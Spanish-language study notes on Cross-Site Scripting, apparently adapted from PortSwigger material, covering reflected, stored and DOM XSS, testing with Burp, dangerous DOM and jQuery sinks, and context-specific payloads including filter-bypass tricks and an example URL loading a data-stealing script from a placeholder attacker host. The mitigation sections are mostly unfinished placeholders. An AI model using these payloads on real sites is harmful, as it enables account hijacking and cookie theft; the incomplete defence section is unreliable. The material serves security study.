<h1 id="portswigger-xss">Cross-Site Scripting (XSS)</h1>

- [¿Qué es un Cross-Site Scripting?](#que-xss)
- [¿Cómo funciona un XSS?](#como-xss)
- [¿Qué tipos de XSS existen?](#tipo-xss)
  - [Reflected XSS](#reflected-xss)
    - [Impacto de los ataques reflected XSS](#impacto-reflected-xss)
    - [Contextos de reflected XSS](#context-reflected-xss)
    - [¿Cómo se puede encontrar y testear una vulnerabilidad de reflected XSS?](#find-reflected-xss)
  - [Stored XSS](#stored-xss)
    - [Impacto de los ataques stored XSS](#impacto-stored-xss)
    - [Contextos de stored XSS](#context-stored-xss)
    - [¿Cómo se puede encontrar y testear una vulnerabilidad de stored XSS?](#find-stored-xss)
  - [DOM-based XSS](#dom-xss)
    - [¿Cómo testear un DOM-based XSS?](#test-dom-xss)
      - [Testeando HTML sinks](#testeando-html-sinks)
      - [Testeando sinks que ejecutan JavaScript](#testeando-sinks-que-ejecutan-javascript)
    - [¿Qué sinks pueden generar vulnerabilidades DOM-XSS?](#que-sink-xss)
  - [Contextos](#contextos)
    - [XSS entre tags HTML](#contextos-xss-tags-html)
    - [XSS en atributos de tag HTML](#contextos-xss-atributos-tag-html)
    - [XSS en un JavaScript](#contextos-xss-javascript)
      - [Terminando el script existente](#contextos-terminando-script-existente)
      - [Rompiendo el string de JavaScript](#contextos-rompiendo-string-javascript)
      - [Haciendo uso de la codificación HTML](#contextos-haciendo-uso-codificación-html)
      - [XSS en templates literales de JavaScript](#contextos-xss-templates-literales-javascript)
    - [XSS en el contexto del sandbox de AngularJS](#xss-contexto-sandbox-angularjs)
- [Mitigación](#mitigacion)
  - [Codificar datos en la salida](#codificar-datos-salida)
  - [Validar la entrada a la llegada](#validar-entrada-llegada)
    - [Whitelisting vs blacklisting](#whitelisting-blacklisting)
  - [Permitir HTML "seguro"](#permitir-html-seguro)
  - [Cómo prevenir XSS usando un motor de plantilla](#prevenir-xss-motor-plantilla)
  - [Cómo prevenir XSS en PHP](#prevenir-xss-php)
  - [Cómo prevenir XSS del lado del cliente en JavaScript](#prevenir-xss-client-side-js)
  - [Cómo prevenir XSS en PHP](#prevenir-xss-php)
  - [Cómo prevenir XSS usando Content Security Policy (CSP)](#prevenir-xss-csp)
    - [Content Security Policy](#content-security-policy)

<h2 id="que-xss">¿Qué es un Cross-Site Scripting?</h2>

Un cross-site scripting (también conocido como XSS), es una vulnerabilidad web, la cual, permite a un atacante comprometer la interacción de un usuario con la aplicación.

Por lo general, este tipo de ataque permite al atacante hacerse pasar por la víctima, donde, puede llevar a cabo cualquier acción que la víctima pueda realizar, y poder acceder a información de este. Esto podría permitir al atacante ganar privilegios sobre esta, si es que la víctima tiene control sobre esta.

<h2 id="como-xss">¿Cómo funciona un XSS?</h2>

Estos permiten manipular una web vulnerable, retornando un JavaScript malicioso a un usuario. Por lo tanto, cuando este código es ejecutado en el lado del cliente, el atacante ha comprometido completamente la interacción del usuario con la aplicación.

Por ejemplo:

El usuario necesita enviar datos sensibles a la web, pero esta se encuentra comprometida:

1.	El usuario escribe un mensaje, las cuales son enviadas por un método GET al servidor.
2.	Este envío se encuentra comprometido, y el JavaScript indica que se van a enviar dichos datos a la página del atacante (`https://www.site.com/comments?message=<script src=https://attacker-site.com/stealdata.js></script>`).
3.	Los datos son almacenados en la página del atacante (como, por ejemplo, las cookies del usuario).

<h2 id="tipo-xss">¿Qué tipos de XSS existen?</h2>

Existen 3 tipos principales de XSS:

- **Reflected XSS:** cuando el script malicioso viene del HTTP request actual.
- **Stored XSS:** cuando el script es almacenado en la base datos del sitio web.
- **DOM-based XSS:** cuando la vulnerabilidad existe en el código del lado del cliente

<h3 id="reflected-xss">Reflected XSS</h3>

Esta vulnerabilidad aparece cuando la web recibe los datos enviados en el HTTP request y los incluye en la respuesta de forma insegura:

![port-xss-1](https://github.com/W0lfF4ng/Cheat-Sheet/blob/master/img/web/port-xss-1.png)

Si la víctima visita la URL construida por el atacante, se ejecutarán los scripts maliciosos en el navegador del usuario. Este script puede llevar a cabo cualquier acción y recuperar cualquier dato al que el usuario tenga acceso.

<h4 id="impacto-reflected-xss">Impacto de los ataques reflected XSS</h4>

Si un atacante puede controlar un script que se ejecuta en el navegador de la víctima, este puede:

-	Realizar cualquier acción que el usuario puede hacer dentro de la aplicación.
-	Ver cualquier información que el usuario está habilitada para ver.
-	Modificar cualquier información que el usuario está habilitada para modificar.
-	Iniciar interacción con otros usuarios de la aplicación, incluidos ataques, los cuales, parecerán realizados por la víctima.

Existen múltiples medios para que un usuario sea víctima de este ataque:

-	Colocar enlaces en un sitio web controlado por el atacante.
-	Enlaces en otro sitio web que permita generar contenido.
-	Enviar un tweet u otro mensaje.

El impacto de este ataque es mucho menor al stored XSS, debido que se necesita un mecanismo externo para realizar el ataque.

<h4 id="context-reflected-xss">Contextos de reflected XSS</h4>

Hay muchas formas de scripts para realizar un reflected XSS, donde, depende de la ubicación de los datos reflejados en la respuesta de la aplicación es cual payload se utilizará para realizar la explotación.

También, el payload depende de las validaciones u procesamientos que realiza la aplicación antes de reflejar los datos.

Los contextos que se pueden nombrar son:

-	XSS entre tags HTML
-	XSS en los atributos de un tag HTML
-	XSS en un JavaScript
-	XSS en el contexto del sandbox de AngularJS

<h4 id="find-reflected-xss">¿Cómo se puede encontrar y testear una vulnerabilidad de reflected XSS?</h4>

La mayoría de estos XSS se pueden encontrar usando un interception proxy, donde, los más populares son [Burp Suite](https://portswigger.net/burp) y [ZAP](https://owasp.org/www-project-zap/).

Realizar pruebas manuales de esta vulnerabilidad envuelve los siguientes pasos:

- **Probar todos los puntos de entrada:** testear por separado todos los puntos de entrada del HTTP request. Aquí se incluyen:
  - Parámetros
  - Otros datos dentro del string de la consulta de la URL y el cuerpo del mensaje
  - HTTP headers
- **Enviar valores alfanuméricos random:** para cada punto de entrada, enviar un valor aleatorio para validar si este es reflejado en la respuesta. Este valor debe estar pensado para pasar todas las validaciones de entrada. Para esto, debe ser corto y solo contener caracteres alfanuméricos, pero no tan corto, con el fin de hacer coincidencias accidentales que son altamente improbables dentro de la aplicación. Se recomienda que este sea de 8 caracteres (es posible usar la opción **Intruder** de Burp).
- **Determinar el contexto de reflexión:** es necesario determinar el contexto de la reflexión basándonos en la ubicación de los datos inyectados en la respuesta.
- **Probar un payload candidato:** según lo determinado en el paso anterior, realizar pruebas con el payload (en este punto se recomienda usar la opción **Repeater** del Burp). Se recomienda testear el payload tanto antes como después del valor aleatorio inicial.
- **Probar payloads alternativos:** puede que la aplicación bloquee el payload enviado, para esto, se deben probar nuevos payloads y nuevas técnicas para poder explotar esta vulnerabilidad.
- **Probar el ataque en el navegador:** en caso de encontrar un payload que funciona en **Repeater**, se recomienda transferir el ataque al navegador, para validar la inyección.

<h3 id="stored-xss">Stored XSS</h3>

Stored XSS (también conocido como persisten XSS o second-order XSS), es cuando se reciben los datos del HTTP request, y esto son almacenados en el lado del servidor, por lo tanto, cada vez que se consuma ese recurso de la aplicación web, se ejecutará el script malicioso.

Ejemplos de los datos que se pueden enviar, son comentarios en una web, nicknames en un chat, o detalles de contacto en un pedido.

En otros casos, los datos pueden llegar de otras fuentes no confiables; por ejemplo, una aplicación de correo web que muestra mensajes recibidos a través de SMTP, una aplicación de marketing que muestra publicaciones en redes sociales o una aplicación de monitoreo de red que muestra datos del tráfico de red.

En el siguiente ejemplo, al momento de crear un usuario en la aplicación web, el campo username es vulnerable a stored XSS, por lo tanto, cada vez que se ingrese a **users.php**, se ejecutará el script configurado:

![port-xss-2](https://github.com/W0lfF4ng/Cheat-Sheet/blob/master/img/web/port-xss-2.png)

Si vemos que se encuentra cargando la página, en la sección del username se tiene un script que muestra un pop-up con el mensaje **xss**:

![port-xss-3](https://github.com/W0lfF4ng/Cheat-Sheet/blob/master/img/web/port-xss-3.png)

<h4 id="impacto-stored-xss">Impacto de los ataques stored XSS</h4>

Si un atacante puede controlar el script que se ejecuta en el navegador de la víctima, puede llevar a cabo cualquier acción.

A diferencia del reflected XSS, cada vez que un usuario visite una web comprometida con esta vulnerabilidad, se ejecutará el script malicioso. Por lo tanto, permite realizar ataques autónomos.

<h4 id="context-stored-xss">Contextos de stored XSS</h4>

Existe múltiples variantes de un stored XSS, y este depende de la locación de donde se almacenen los datos.

Los contextos que se pueden nombrar son:

- XSS entre tags HTML
- XSS en los atributos de un tag HTML
- XSS en un JavaScript

<h4 id="find-stored-xss">¿Cómo se puede encontrar y testear una vulnerabilidad de stored XSS?</h4>

Una gran parte de estos XSS pueden ser detectados mediante un interception proxy.

Se deben testear todos los puntos de entrada, donde, los datos controlados por el atacante son procesados por la aplicación, y los puntos de salida en los que esos datos pueden aparecer en la respuesta de la aplicación.

Los puntos de entrada en el procesamiento de una aplicación incluyen:

- Parámetros u otros datos dentro de la consulta en la URL y el cuerpo del mensaje.
- La ruta del archivo en la URL.
- Los headers del HTTP request que podrían no ser explotados en relación con un reflected XSS.
- Cualquier ruta fuera de banda a través de la cual un atacante puede enviar datos a la aplicación, ejemplos: una aplicación de correo web procesará los datos recibidos en los correos electrónicos; una aplicación que muestra un feed de Twitter puede procesar datos contenidos en tweets de terceros; y un agregador de noticias incluirá datos originados en otros sitios web.

Los puntos de salida son todos los HTTP response posibles que se devuelven a cualquier usuario de la aplicación.

El primer paso en la prueba de vulnerabilidades stored XSS es localizar los enlaces entre los puntos de entrada y salida, por lo que los datos enviados a un punto de entrada son emitidos desde un punto de salida. Esto podría ser un desafío por las siguientes razones:

- Los datos enviados a cualquier punto de entrada podrían ser emitido en cualquier punto de salida.
- Los datos almacenados por la aplicación a menudo son vulnerables a sobrescribirse debido a otras acciones realizadas dentro de la aplicación. Por ejemplo, una función de búsqueda puede mostrar una lista de búsquedas recientes, que se reemplazan rápidamente a medida que los usuarios realizan otras búsquedas.

Identificar exhaustivamente los enlaces entre los puntos de entrada y salida implicaría probar cada permutación por separado, enviar un valor específico al punto de entrada, navegar directamente al punto de salida y determinar si el valor aparece allí. Sin embargo, este enfoque no es práctico en una aplicación con más de unas pocas páginas.

Un enfoque más realista es trabajar sistemáticamente a través de los puntos de entrada de datos, enviando un valor específico a cada uno de ellos y monitorear las respuestas de la aplicación para detectar cuando aparece el valor enviado.

Cuando haya identificado enlaces entre los puntos de entrada y salida en el procesamiento de la aplicación, cada enlace debe probarse específicamente para detectar si existe una vulnerabilidad de stored XSS. El payload a utilizar dependerá del contexto dentro de la respuesta, y la metodología a usar, es similar a la usada en reflected XSS.

<h3 id="dom-xss">DOM-based XSS</h3>

También conocido como DOM XSS es cuando una aplicación contiene un JavaScript en el lado del cliente que procesa datos desde un origen inseguro de una forma insegura, generalmente escribiendo los datos nuevamente en el DOM.

Por lo tanto, cuando un JavaScript toma datos desde un origen controlado por un atacante (como la URL), y los pasa a un [sink](https://www.acunetix.com/blog/articles/finding-source-dom-based-xss-vulnerability-acunetix-wvs/#:~:text=Sinks%2C%20on%20the%20other%20hand,Execution%20Sink) que admite la ejecución dinámica de código (por ejemplo: **eval()** o **innerHTML**). Esto permite al atacante ejecutar un JavaScript malicioso, con el cual, podría secuestrar las cuentas de otros usuarios.

Para realizar este ataque, se deben colocar datos en un origen para que se propaguen a un sink, y provoque la ejecución de JavaScript de forma arbitraria.

El origen más común es la URL, donde se usa el objeto **Windows.location**.

Un atacante puede construir un enlace para enviar a una víctima a una página vulnerable con una payload útil en string de la consulta y fragmentar partes de la URL (como cuando se dirige a una página 404 o un sitio web que ejecuta PHP, el payload se puede colocar en la ruta).

<h4 id="test-dom-xss">¿Cómo testear un DOM-based XSS?</h4>

Al igual que los otros tipos de XSS, este puede ser detectado usando un intercepting proxy.

Para testear este XSS, se debe tener un navegador con herramientas de desarrollador, como Firefox y Chrome.

<h5 id="testeando-html-sinks">Testeando HTML sinks</h5>

Para testear un DOM XSS en un HTML sink, se debe tener un string alfanumérico random en el origen (como **location.search**), entonces se debe usar las herramientas de desarrollo para inspeccionar el HTML y buscar donde se encuentra el string ingresado (no se recomienda el uso de **View source** del navegador debido que no funcionará para las pruebas DOM XSS porque no tiene en cuenta los cambios que JavaScript ha realizado en HTML).

Para cada ubicación donde aparece el string dentro del DOM, se debe identificar el contexto. Según este contexto, debe refinar su entrada para ver cómo se procesa.

Es necesario que los navegadores se comportan de manera diferente con respecto a la codificación de URL.

<h5 id="testeando-sinks-que-ejecutan-javascript">Testeando sinks que ejecutan JavaScript</h5>

Con estos sinks, no se muestra nuestra entrada en los DOM. Para poder encontrarla, se debe revisar en el debugger de JavaScript para identificar si la entrada se envía a un receptor y como es enviado.

Por cada potencial origen (como location), se debe encontrar dentro del código JavaScript de la página donde se hace referencia al origen.

Una vez que identificado dónde se está leyendo el origen, se puede usar el debugger de JavaScript para agregar un punto de interrupción y ver cómo se está usando el valor del origen. Se puede encontrar que la fuente se asigna a otras variables. Si este es el caso, se deberá volver a utilizar la función de búsqueda para rastrear estas variables y ver si se pasan a un sink. Cuando se encuentre un sink al que se le están asignando los datos del origen, se puede usar el debugger para inspeccionar el valor pasando el cursor sobre la variable para mostrar su valor antes de enviarlo al sink. Luego, al igual que con los sink HTML, se debe refinar la entrada para ver si se puede lanzar un ataque XSS exitoso.

<h4 id="que-sink-xss">¿Qué sinks pueden generar vulnerabilidades DOM-XSS?</h4>

La siguiente lista contiene los principales sinks que pueden generar una vulnerabilidad DOM XSS:

- document.write()
- document.writeln()
- document.domain
- someDOMElement.innerHTML
- someDOMElement.outerHTML
- someDOMElement.insertAdjacentHTML
- someDOMElement.onevent

Las siguientes funciones jQuery también son principales sinks que pueden generar una vulnerabilidad DOM XSS:

- add()
- after()
- append()
- animate()
- insertAfter()
- insertBefore()
- before()
- html()
- prepend()
- replaceAll()
- replaceWith()
- wrap()
- wrapInner()
- wrapAll()
- has()
- constructor()
- init()
- index()
- jQuery.parseHTML()
- $.parseHTML()

<h3 id="contextos">Contextos</h3>

Cuando se hacen pruebas para reflected XSS y stored XSS, la clave es identificar el contexto de este:

- La ubicación dentro de la respuesta donde aparecen los datos enviados por el atacante.
- Cualquier validación de entrada u otro procesamiento que la aplicación esté realizando en esos datos.

<h4 id="contextos-xss-tags-html">XSS entre tags HTML</h4>

Cuando el XSS se encuentra entre tags HTML, es necesario introducir un nuevo tag diseñado para ejecutar.

Ejemplo de payload:

```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

<h4 id="contextos-xss-atributos-tag-html">XSS en atributos de tag HTML</h4>

Cuando este se encuenta entre atributos del tag HTML, es necesario terminar el valor del atributo.

Ejemplo de payload:

```
"><script>alert(document.domain)</script>
```

Es común que los corchetes angulares (`<>`) están bloqueados o codificados, por lo que, no es posible salirse de la etiqueta en la que estamos. Para terminar el valor del atributo, se puede introducir un nuevo atributo que crea un contexto programable.

Ejemplo de payload:

```
" autofocus onfocus=alert(document.domain) x="
```

A veces, el contexto XSS está en un tipo de atributo de etiqueta HTML que por sí mismo puede crear un contexto programable. Aquí, se puede ejecutar JavaScript sin necesidad de terminar el valor del atributo. 

Ejemplo de payload:

```
<a href="javascript:alert(document.domain)">
```

Es posible encontrar sitios web que codifican corchetes angulares (`<>`), pero aún se permite inyectar atributos. A veces, estas inyecciones son posibles incluso dentro de etiquetas que generalmente no activan eventos automáticamente, como una [etiqueta canónica](https://es.ryte.com/wiki/Etiqueta_Rel%3DCanonical). Se puede aprovechar este comportamiento mediante las claves de acceso y la interacción del usuario en Chrome. Las teclas de acceso permiten proporcionar atajos de teclado que hacen referencia a un elemento específico. El atributo `accesskey` permite definir una letra que, cuando se presiona en combinación con otras teclas (que varían en diferentes plataformas), provocará que se activen eventos.

<h4 id="contextos-xss-javascript">XSS en un JavaScript</h4>

Cuando el contexto XSS es algún JavaScript existente dentro de la respuesta, pueden surgir una amplia variedad de situaciones, con diferentes técnicas necesarias para realizar un exploit exitoso.

<h5 id="contextos-terminando-script-existente">Terminando el script existente</h5>

En el caso más simple, es posible cerrar la etiqueta contiene el JavaScript existente e introducir algunas etiquetas HTML nuevas que activarán la ejecución de JavaScript.

Ejemplo de payload:

```
</script><img src=1 onerror=alert(document.domain)>
```

La razón por la que esto funciona es que el navegador primero realiza el análisis de HTML para identificar los elementos de la página, incluidos los bloques de secuencia de comandos, y luego realiza el análisis de JavaScript para comprender y ejecutar las secuencias de comandos incrustadas. El payload anterior deja el script original roto, con una cadena literal sin terminar. Pero eso no impide que la secuencia de comandos posterior se analice y ejecute de la manera normal.

<h5 id="contextos-rompiendo-string-javascript">Rompiendo el string de JavaScript</h5>

En los casos en los que el contexto XSS está dentro de un string literal entre comillas, a menudo es posible salirse de este y ejecutar JavaScript directamente. Es esencial reparar el script siguiendo el contexto XSS, porque cualquier error de sintaxis impedirá que se ejecute todo el script.

Ejemplo de payload:

```
'-alert(document.domain)-'
';alert(document.domain)//
```

Algunas aplicaciones intentan evitar que la entrada se salga del string de JavaScript escapando los caracteres de comillas simples con un backslash. Un backslash antes de un carácter le dice al analizador de JavaScript que el carácter debe interpretarse literalmente y no como un carácter especial, como un terminador de string. En esta situación, las aplicaciones suelen cometer el error de no escapar del carácter del backslash. Esto significa que un atacante puede usar su propio backslash para neutralizar el backslash que agrega la aplicación.

Ejemplo de payload:

```
\';alert(document.domain)//
```

El primer backslash significa que el segundo backslash se interpreta literalmente y no como un carácter especial. Esto significa que la comilla ahora se interpreta como un terminador de string, por lo que el ataque tiene éxito.

Algunos sitios web hacen que los XSS sea más difíciles de explotar al restringir los caracteres. Esto puede ser a nivel del sitio web o mediante la implementación de un WAF que evite que los request lleguen al sitio web. En estas situaciones, se debe experimentar con otras formas de llamar a funciones que eluden estas medidas de seguridad. Una forma de hacer esto es usar la instrucción `throw` con un manejador de excepciones. Esto permite pasar argumentos a una función sin usar paréntesis. El siguiente código asigna la función `alert()` al manejador de excepciones global y la declaración `throw` pasa el `1` al manejador de excepciones (en este caso, `alert`). El resultado final es la llamada a la función `alert()` con `1` como argumento.

```
onerror=alert;throw 1
```

<h5 id="contextos-haciendo-uso-codificación-html">Haciendo uso de la codificación HTML</h5>

Cuando el contexto XSS es un JavaScript existente dentro de un atributo de etiqueta entre comillas (como un controlador de eventos), es posible hacer uso de la codificación HTML para evitar algunos filtros de entrada.

Cuando el navegador ha analizado las etiquetas HTML y los atributos dentro de una respuesta, realizará la decodificación HTML de los valores de los atributos de las etiquetas antes de que se procesen más. Si la aplicación del lado del servidor bloquea o `sanitiza` ciertos caracteres que son necesarios para un exploit XSS exitoso. A veces, se puede realizar un bypass de la validación de entrada codificando en HTML esos caracteres.

Ejemplo: se tiene el siguiente contexto XSS.

```
<a href="#" onclick="... var input='controllable data here'; ...">
```

La aplicación bloquea o escapa las comillas simples, se puede usar el siguiente payload para quebrar el string JavaScript y ejecutar el nuestro:

```
&apos;-alert(document.domain)-&apos;

```

En este caso, la secuencia `&apos;`es una entidad HTML que representa un apóstrofo o una comilla simple.

<h5 id="contextos-xss-templates-literales-javascript">XSS en templates literales de JavaScript</h5>

Los templates literales de JavaScript son strings literales que permiten expresiones de JavaScript incrustadas. Las expresiones incrustadas se evalúan y normalmente se concatenan en el texto circundante. Los literales de plantilla se encapsulan en backticks (``) en lugar de comillas normales, y las expresiones incrustadas se identifican mediante la sintaxis `${...}`.

Ejemplo de templates literales:

```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

En este caso no es necesario terminar el template literal, solo se necesita usar la sintaxis incrustada (`${...}`).

Ejemplo de payload:

```
${alert(document.domain)}
```

<h4 id="xss-contexto-sandbox-angularjs">XSS en el contexto del sandbox de AngularJS</h4>

A veces, las vulnerabilidades XSS surgen en el contexto de AngularJS sandbox. Esto presenta barreras adicionales para la explotación, que a menudo se pueden sortear con suficiente ingenio.

FALTA!!!

<h2 id="mitigacion">Mitigación</h2>

La mitigación de los XSS generalmente se puede lograr mediante dos capas de defensa:

- Codificar datos en la salida
- Validar la entrada a la llegada

<h3 id="codificar-datos-salida">Codificar datos en la salida</h3>

La codificación debe aplicarse directamente antes de que los datos controlables por el usuario se escriban en una página, porque el contexto en el que está escribiendo determina qué tipo de codificación necesita usar. Por ejemplo, los valores dentro de un string JavaScript requieren un tipo de escape diferente a los de un contexto HTML.

En un contexto HTML, debe convertir los valores no incluidos en la lista blanca en entidades HTML:

- `<` se convierte en `&lt;`
- `>` se convierte en `&gt;`

En un contexto de string JavaScript, los valores no alfanuméricos deben tener un escape Unicode:

- `<` se convierte en `\u003c`
- `>` se convierte en `\u003e`

<h3 id="validar-entrada-llegada">Validar la entrada a la llegada</h3>

asd

<h4 id="whitelisting-blacklisting">Whitelisting vs blacklisting</h4>

asd

<h3 id="permitir-html-seguro">Permitir HTML "seguro"</h3>

asd

<h3 id="prevenir-xss-motor-plantilla">Cómo prevenir XSS usando un motor de plantilla</h3>

asd

<h3 id="prevenir-xss-php">Cómo prevenir XSS en PHP</h3>

asd

<h3 id="prevenir-xss-client-side-js">Cómo prevenir XSS del lado del cliente en JavaScript</h3>

asd

<h3 id="prevenir-xss-php">Cómo prevenir XSS en PHP</h3>

asd

<h3 id="prevenir-xss-csp">Cómo prevenir XSS usando Content Security Policy (CSP)</h3>

asd

<h4 id="content-security-policy">Content Security Policy</h4>

asd
